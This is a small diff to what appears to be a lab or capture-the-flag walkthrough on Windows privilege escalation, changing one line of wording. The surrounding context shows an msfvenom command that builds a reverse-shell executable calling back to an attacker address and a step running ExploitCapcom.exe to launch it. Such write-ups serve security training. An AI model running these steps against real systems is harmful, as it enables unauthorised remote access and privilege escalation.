@@ -29,7 +29,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f exe > sh
 ```
 
 Upload it on Traget machine.
-Now the exploit.
+Now execute the exploit.
 ```markdown
 .\ExploitCapcom.exe EXPLOIT shell.exe
 ```
